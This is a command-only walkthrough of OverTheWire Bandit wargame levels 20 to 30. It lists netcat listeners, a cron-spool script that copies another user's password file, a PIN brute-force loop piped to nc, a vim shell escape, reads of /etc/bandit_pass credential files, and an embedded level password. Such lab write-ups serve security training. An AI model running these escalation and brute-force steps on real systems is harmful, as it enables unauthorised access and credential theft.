# OverTheWire Bandit – Levels 20 to 30 (Commands Used)

--------------------------------
Level 20 → 21
COMMANDS USED:
--------------------------------
ssh bandit20@bandit.labs.overthewire.org -p 2220
nc -lvp 4444 &
./suconnect 4444

--------------------------------
Level 21 → 22
COMMANDS USED:
--------------------------------
ssh bandit21@bandit.labs.overthewire.org -p 2220
cat /etc/cron.d/cronjob_bandit22
cat /usr/bin/cronjob_bandit22.sh
cat /tmp/t8vHjHkG7R

--------------------------------
Level 22 → 23
COMMANDS USED:
--------------------------------
ssh bandit22@bandit.labs.overthewire.org -p 2220
cat /etc/cron.d/cronjob_bandit23
cat /usr/bin/cronjob_bandit23.sh
cat /tmp/bandit22

--------------------------------
Level 23 → 24
COMMANDS USED:
--------------------------------
ssh bandit23@bandit.labs.overthewire.org -p 2220
echo "cat /etc/bandit_pass/bandit24 > /tmp/pass24" > /tmp/getpass.sh
chmod +x /tmp/getpass.sh
cp /tmp/getpass.sh /var/spool/bandit24/
sleep 60
cat /tmp/pass24

--------------------------------
Level 24 → 25
COMMANDS USED:
--------------------------------
ssh bandit24@bandit.labs.overthewire.org -p 2220
for i in {0000..9999}; do
  echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
done | nc localhost 30002

--------------------------------
Level 25 → 26
COMMANDS USED:
--------------------------------
ssh bandit25@bandit.labs.overthewire.org -p 2220 -i bandit26.sshkey
:set shell=/bin/bash
:shell
cat /etc/bandit_pass/bandit26

--------------------------------
Level 26 → 27
COMMANDS USED:
--------------------------------
ssh bandit26@bandit.labs.overthewire.org -p 2220 -i bandit26.sshkey
./bandit27-do cat /etc/bandit_pass/bandit27

--------------------------------
Level 27 → 28
COMMANDS USED:
--------------------------------
ssh bandit27@bandit.labs.overthewire.org -p 2220
git clone ssh://bandit27@localhost/home/bandit27-git/repo
cd repo
cat README

--------------------------------
Level 28 → 29
COMMANDS USED:
--------------------------------
ssh bandit28@bandit.labs.overthewire.org -p 2220
git clone ssh://bandit28@localhost/home/bandit28-git/repo
cd repo
git log
git checkout <commit-id>
cat README.md

--------------------------------
Level 29 → 30
COMMANDS USED:
--------------------------------
ssh bandit29@bandit.labs.overthewire.org -p 2220
git clone ssh://bandit29@localhost/home/bandit29-git/repo
cd repo
git branch -a
git checkout dev
cat README.md
